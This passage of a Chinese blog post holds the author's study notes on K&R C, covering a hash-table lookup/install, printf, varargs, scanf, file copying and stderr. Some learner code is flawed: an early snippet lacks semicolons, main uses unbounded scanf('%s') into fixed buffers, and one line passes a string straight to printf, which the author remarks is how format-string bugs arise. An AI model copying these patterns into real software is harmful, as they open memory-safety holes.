class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">strdup</span><span class=\"params\">(<span class=\"type\">char</span> *)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">install</span><span class=\"params\">(<span class=\"type\">char</span> *name, <span class=\"type\">char</span> *defn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">np</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> hashval;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>((np = lookup(name)) == <span class=\"literal\">NULL</span>)&#123;<span class=\"comment\">//未找到</span></span><br><span class=\"line\">        np = (<span class=\"keyword\">struct</span> nlist *) <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(*np));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (np == <span class=\"literal\">NULL</span> || (np-&gt;name = strdup(name)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        hashval = hash(name);</span><br><span class=\"line\">        np-&gt;next = hashtab[hashval]; <span class=\"comment\">//头插,</span></span><br><span class=\"line\">        hashtab[hashval] = np;       </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)np-&gt;defn)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((np-&gt;defn = strdup(defn)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> np;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t整合</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span>&#123;</span> <span class=\"comment\">//链表项</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">next</span>;</span> <span class=\"comment\">//链表中下一个表项</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *name;\t\t\t<span class=\"comment\">//定义的名字</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *defn;\t\t\t<span class=\"comment\">//替换文本</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> HASHSIZE 101</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">hashtab</span>[<span class=\"title\">HASHSIZE</span>];</span> <span class=\"comment\">//指针表</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">lookup</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">strdup1</span><span class=\"params\">(<span class=\"type\">char</span> *)</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"title function_\">hash</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">install</span><span class=\"params\">(<span class=\"type\">char</span> *name, <span class=\"type\">char</span> *defn)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1.add\\n&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">char</span> *name,*defn;</span><br><span class=\"line\">    name = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\">    defn = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (name == <span class=\"literal\">NULL</span> || defn == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;内存分配失败\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入名字和替换的名字&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s %s&quot;</span>,name,defn);<span class=\"comment\">//这直接用是不对的,需要分配内存</span></span><br><span class=\"line\">        install(name,defn);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(name);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(defn);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// hash函数, 为字符串s生成散列值</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"title function_\">hash</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> hashval;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(hashval=<span class=\"number\">0</span>; *s !=<span class=\"string\">&#x27;\\0&#x27;</span>;s++)</span><br><span class=\"line\">        hashval = *s + <span class=\"number\">31</span>* hashval;  <span class=\"comment\">//数字的相加</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashval % HASHSIZE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">lookup</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">np</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (np = hashtab[hash(s)]; np != <span class=\"literal\">NULL</span>; np = np-&gt;next)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(s, np-&gt;name) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> np;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">install</span><span class=\"params\">(<span class=\"type\">char</span> *name, <span class=\"type\">char</span> *defn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">np</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> hashval;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>((np = lookup(name)) == <span class=\"literal\">NULL</span>)&#123;<span class=\"comment\">//未找到</span></span><br><span class=\"line\">        np = (<span class=\"keyword\">struct</span> nlist *) <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(*np));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (np == <span class=\"literal\">NULL</span> || (np-&gt;name = strdup(name)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        hashval = hash(name);</span><br><span class=\"line\">        np-&gt;next = hashtab[hashval]; <span class=\"comment\">//头插,</span></span><br><span class=\"line\">        hashtab[hashval] = np;       </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *) np-&gt;defn);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((np-&gt;defn = strdup1(defn)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> np;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">strdup1</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p;</span><br><span class=\"line\">    </span><br><span class=\"line\">    p = (<span class=\"type\">char</span> *) <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(s)+<span class=\"number\">1</span>);<span class=\"comment\">//+1是因为结尾要加\\0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(p,s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"6-7-6-8-类型定义-typedef-、位字段\"><a href=\"#6-7-6-8-类型定义-typedef-、位字段\" class=\"headerlink\" title=\"6.7 6.8  类型定义(typedef)、位字段\"></a>6.7 6.8  类型定义(typedef)、位字段</h2><h1 id=\"第七章-输入与输出\"><a href=\"#第七章-输入与输出\" class=\"headerlink\" title=\"第七章 输入与输出\"></a>第七章 输入与输出</h1><h2 id=\"7-1-标准输入输出\"><a href=\"#7-1-标准输入输出\" class=\"headerlink\" title=\"7.1 标准输入输出\"></a>7.1 标准输入输出</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//用于将输入转换为小写字母的形式</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((c = getchar()) != EOF)</span><br><span class=\"line\">        <span class=\"built_in\">putchar</span>(<span class=\"built_in\">tolower</span>(c));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7-2-格式化输出-printf函数\"><a href=\"#7-2-格式化输出-printf函数\" class=\"headerlink\" title=\"7.2 格式化输出 printf函数\"></a>7.2 格式化输出 printf函数</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *s =  <span class=\"string\">&quot;hello,lihua&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(s); <span class=\"comment\">//格式化字符串漏洞不就是这么来的嘛...</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"7-3-变长参数表\"><a href=\"#7-3-变长参数表\" class=\"headerlink\" title=\"7.3 变长参数表\"></a>7.3 变长参数表</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdarg.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">minprintf</span><span class=\"params\">(<span class=\"type\">char</span> *fmt, ...)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    va_list ap;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p, *sval;</span><br><span class=\"line\">    <span class=\"type\">int</span> ival;</span><br><span class=\"line\">    <span class=\"type\">double</span> dval;</span><br><span class=\"line\">    </span><br><span class=\"line\">    va_start(ap, fmt);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (p= fmt; *p; p++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>( *p!=<span class=\"string\">&#x27;%&#x27;</span>)&#123; <span class=\"comment\">//为啥只取一个字符呢</span></span><br><span class=\"line\">            <span class=\"built_in\">putchar</span>(*p);</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(*++p)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">                ival = va_arg(ap,<span class=\"type\">int</span>);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>, ival);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;f&#x27;</span>:</span><br><span class=\"line\">                dval = va_arg(ap, <span class=\"type\">double</span>);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%f&quot;</span>,dval);</span><br><span class=\"line\">             \t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&#x27;s&#x27;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (sval = va_arg(ap, <span class=\"type\">char</span> *); *sval; sval++)</span><br><span class=\"line\">                    <span class=\"built_in\">putchar</span>(*sval);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"built_in\">putchar</span>(*p);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    va_end(ap);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    minprintf(<span class=\"string\">&quot;hello,wolrd:%d,%s\\n&quot;</span>,<span class=\"number\">1</span>,<span class=\"string\">&quot;ooo&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7-4-格式化输入-scanf函数\"><a href=\"#7-4-格式化输入-scanf函数\" class=\"headerlink\" title=\"7.4 格式化输入 scanf函数\"></a>7.4 格式化输入 scanf函数</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">double</span> sum, v;</span><br><span class=\"line\">    </span><br><span class=\"line\">    sum = <span class=\"number\">0</span> ;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%lf&quot;</span>, &amp;v) == <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\t%.2f\\n&quot;</span>,sum+=v);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> day,month,year;</span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d/%d/%d&quot;</span>,&amp;month,&amp;day,&amp;year);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d年%d月%d日\\n&quot;</span>,year,month,day);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"7-5-文件访问\"><a href=\"#7-5-文件访问\" class=\"headerlink\" title=\"7.5 文件访问\"></a>7.5 文件访问</h2><p>​\t这里和pwn的iofile关系很大</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">filecopy</span><span class=\"params\">(FILE *, FILE *)</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc == <span class=\"number\">1</span>) filecopy(<span class=\"built_in\">stdin</span>,<span class=\"built_in\">stdout</span>); <span class=\"comment\">//没有命令行参数、复制标准输入</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(--argc &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((fp = fopen(*++argv,<span class=\"string\">&quot;r&quot;</span>)) == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;cat: can&#x27;t open %s\\n&quot;</span>,*argv);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                filecopy(fp,<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">                fclose(fp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 将文件ifp复制到文件ofp</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">filecopy</span><span class=\"params\">(FILE *ifp,FILE *ofp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( (c = getc(ifp))!=EOF)</span><br><span class=\"line\">        putc(c,ofp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\tgdb调试一下 , 可以结合之前看的open什么的那个链来学习一下\t\t</p>\n<h2 id=\"7-6-错误处理\"><a href=\"#7-6-错误处理\" class=\"headerlink\" title=\"7.6 错误处理\"></a>7.6 错误处理</h2><p>​\t增加了stderr</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span>  <span class=\"comment\">// exit函数</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">filecopy</span><span class=\"params\">(FILE *, FILE *)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> *prog = argv[<span class=\"number\">0</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc == <span class=\"number\">1</span>) filecopy(<span class=\"built_in\">stdin</span>,<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(--argc &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((fp = fopen(*++argv,<span class=\"string\">&quot;r&quot;</span>)) == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot; %s:  can&#x27;t open %s\\n&quot;</span>,prog,*argv);</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                filecopy(fp,<span 